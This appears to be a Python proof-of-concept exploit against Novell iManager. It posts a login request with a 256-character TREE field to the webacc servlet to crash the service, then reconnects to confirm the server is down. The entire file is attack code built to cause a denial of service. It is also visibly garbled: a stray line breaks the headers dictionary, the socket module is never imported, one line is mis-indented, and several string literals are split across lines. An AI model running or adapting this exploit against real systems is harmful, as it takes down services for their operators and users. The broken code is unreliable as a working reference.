import sys
import time
import httplib


def server_uses_SSL(host, port):
    #Try to determine if the server is using HTTP over SSL or not.
    headers = { 'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0;
Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727;
.NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',

'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-us,en;q=0.5',
                'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
                'Connection':'close'}

    using_ssl = True
    conn = httplib.HTTPSConnection(host, port)
    try:
        conn.request('GET', '/nps/servlet/webacc', headers=headers)
        response = conn.getresponse()
    except socket.sslerror:
        using_ssl = False
    finally:
        conn.close()
    return using_ssl


def post_urlencoded_data(host, port, selector, body, use_ssl,
get_resp=True):

    headers = { 'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0;
Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727;
.NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',

'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-us,en;q=0.5',
'/nps/servlet/webacc'),
                'Content-Type':'application/x-www-form-urlencoded',
                'Content-Length': str(len(body)),
                'Connection':'close'}

    if use_ssl:
        conn = httplib.HTTPSConnection(host, port)
    else:
        conn = httplib.HTTPConnection(host, port)
    conn.request('POST', selector, body, headers)

    html = ''
    #This flag allows me to avoid keeping waiting for a server
response in the last step, when the webserver is crashed
    if get_resp:
        response = conn.getresponse()
        html = response.read()
    conn.close()
    return html


def getPostParameters():
    params  = 'rank=primary&DoLogin=true&forceMaster=false'
    params +=
'&username=admin&password=mipass&tree=%s&Entrada.x=27&Entrada.y=13' %
('A' * 256)
    return params


def main():
    host = sys.argv[1]
    port = int(sys.argv[2])

    #Determine if the server uses plain HTTP (iManager Workstation) or
HTTPS (iManager Server)
    uses_ssl = server_uses_SSL(host, port)
    if uses_ssl:
        print '(+) The server uses HTTP over SSL. Guessed target:
iManager Server.'
    else:
        print '(+) The server uses plain HTTP. Guessed target:
iManager Workstation.'

    print '(+) Sending login request with 256-character long TREE
field...'
    post_urlencoded_data(host, port, '/nps/servlet/webacc',
getPostParameters(), uses_ssl, False)
  print '(+) Malicious request successfully sent.'

    #Wait 10 seconds and try to connect again to iManager, to check if
it's down
    print '(+) Waiting 10 seconds before trying to reconnect to
iManager...'
    time.sleep(10)

    try:
        print '(+) Trying to reconnect...'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.close()
        print '(!) Something went wrong. Novell iManager is still alive.'
    except socket.error:
        print '(*) Attack successful. Novell iManager is down.'

if __name__ == '__main__':
    main()

